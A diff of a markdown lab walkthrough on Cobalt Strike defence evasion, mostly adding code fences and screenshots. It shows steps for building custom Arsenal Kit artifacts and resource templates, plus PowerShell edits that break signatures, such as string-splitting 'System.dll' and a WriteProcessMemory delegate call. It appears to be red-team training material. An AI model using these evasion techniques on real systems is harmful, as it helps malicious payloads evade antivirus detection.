@@ -75,6 +75,8 @@ process-inject {
 ```
 Save the changes.
 
+<img src="/images/defence-evasion-lab-01.png" width=800>  
+
 Restart the team server.
 ```
 sudo /usr/bin/docker restart cobaltstrike-cs-1
@@ -120,27 +122,38 @@ Run build.sh to build the new artifacts.
 ```
 ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
 ```  
+
 Load the Aggressor Script.
 
 Open the Cobalt Strike client.
 Go to Cobalt Strike > Script Manager.
 Click Load.
-Navigate to C:\Tools\cobaltstrike\custom-artifacts\mailslot and select artifact.cna.
+Navigate to `C:\Tools\cobaltstrike\custom-artifacts\mailslot` and select `artifact.cna`.  
 
-## Resource Kit
-If not already open from the previous task, launch Ubuntu WSL from the Windows Terminal.
+<img src="/images/defence-evasion-lab-02.png" width=800>
+
+## Resource Kit  
+
+>launch Ubuntu WSL from the Windows Terminal.
 
 Change the working directory.
-
+```
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
-Run build.sh to copy the resource templates.
+```  
 
+Run build.sh to copy the resource templates.  
+
+```
 ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
+```  
+
 If not already open from the previous task, launch Visual Studio Code.
 
-Go to File > Open Folder and select C:\Tools\cobaltstrike\custom-resources.
+Go to File > Open Folder and select `C:\Tools\cobaltstrike\custom-resources`.
 
-Select template.x64.ps1.
+Select `template.x64.ps1`.
+
+<img src="/images/defence-evasion-lab-03.png" width=800>  
 
 Scroll to line 5 and replace .Equals('System.dll') with .Equals('Sys'+'tem.dll').
 
@@ -149,7 +162,8 @@ Scroll to line 32 and replace it with:
 ```powershell
 $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
 $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
-```
+```  
+
 Save the changes (File > Save).
 
 Select `compress.ps1`.
